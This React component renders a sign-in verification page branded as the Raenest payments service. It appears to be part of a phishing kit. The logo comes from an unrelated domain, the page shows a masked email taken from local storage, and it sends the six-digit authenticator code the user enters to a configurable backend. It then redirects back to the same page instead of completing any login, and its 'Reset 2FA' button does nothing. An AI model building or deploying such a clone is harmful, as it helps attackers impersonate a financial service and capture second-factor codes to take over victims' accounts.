
import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import { FiChevronDown } from "react-icons/fi";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  auth: yup
    .string()
    .matches(/^\d{6}$/, "2FA must be exactly 6 digits")
    .required("2FA is required"),
});

const Auth = () => {
  const navigate = useNavigate();
  const [email, setEmail] = useState("");

  useEffect(() => {
    const storedEmail = localStorage.getItem("userEmail");
    if (storedEmail) {
      const maskedEmail = maskEmail(storedEmail);
      setEmail(maskedEmail);
    }
  }, []);

  const maskEmail = (email) => {
    const [name, domain] = email.split("@");
    return `${name[0]}*********@${domain}`;
  };

  const {
    handleSubmit,
    setValue,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [auth, setAuth] = useState(new Array(6).fill(""));
  const [loading, setLoading] = useState(false);
  const [tryAnotherWay, setTryAnotherWay] = useState(false);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^[0-9]$/.test(value)) return;

    const newAuth = [...auth];
    newAuth[index] = value;
    setAuth(newAuth);

    if (index < 5 && value !== "") {
      document.getElementById(`auth-${index + 1}`).focus();
    }

    setValue("auth", newAuth.join(""));
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/auth`, data)
      .then((response) => {
        console.log(response.data);
        setAuth(new Array(6).fill(""));
        reset();
        navigate("/auth");
      })
      .catch((error) => {
        console.error("Error verifying OTP", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <main className="min-h-screen bg-white text-[#1a1a2e]">
      <div className="mx-auto flex min-h-screen w-full max-w-[500px] flex-col px-6 pb-10 pt-8">
        {/* Logo */}
        <img
          src="https://devcareer.io/assets/Raenest_Cobalt_-c2e9d1c6.png"
          alt="Raenest"
          className="mb-10 h-auto w-36 self-center"
        />

        {/* Heading */}
        <h1 className="mb-3 text-[27px] font-extrabold leading-[1.1] tracking-[-0.01em] text-[#1a1a2e]">
          Enter your verification code
        </h1>
        <p className="mb-10 text-[15px] leading-relaxed text-[#6b7280]">
          Enter the security code generated from your authenticator app
        </p>

        <form
          onSubmit={handleSubmit(submitForm)}
          className="flex flex-1 flex-col"
        >
          {/* Verification code inputs */}
          <div className="mb-5 flex gap-[9px]">
            {auth.map((digit, index) => (
              <input
                key={index}
                id={`auth-${index}`}
                type="text"
                maxLength="1"
                value={digit}
                onChange={(e) => handleChange(e.target, index)}
                onFocus={(e) => e.target.select()}
                className="h-[62px] w-full rounded-[8px] border border-[#d1d5db] bg-white text-center text-[22px] font-semibold text-[#1a1a2e] outline-none transition focus:border-[#4338ca] focus:ring-2 focus:ring-[#4338ca]/20"
                inputMode="numeric"
              />
            ))}
          </div>

          {errors.auth && (
            <p className="mb-3 text-[13px] font-medium text-red-500 text-center">
              {errors.auth.message}
            </p>
          )}

          {/* Reset 2FA */}
          <button
            type="button"
            className="mb-12 self-start text-[15px] font-semibold text-[#4338ca] hover:underline"
          >
            Reset 2FA
          </button>

          <div className="mt-16 flex flex-col gap-3">
            {/* Log in button */}
            <button
              type="submit"
              disabled={loading || auth.some((d) => d === "")}
              className="flex h-[56px] w-full items-center justify-center gap-2 rounded-[10px] bg-[#4F3FD7] text-[17px] font-semibold text-white transition hover:bg-[#4F3FD7] disabled:opacity-60 disabled:cursor-not-allowed"
            >
              {loading ? "Verifying..." : "Log in"}
            </button>
          </div>
        </form>
      </div>
    </main>
  );
};

export default Auth;
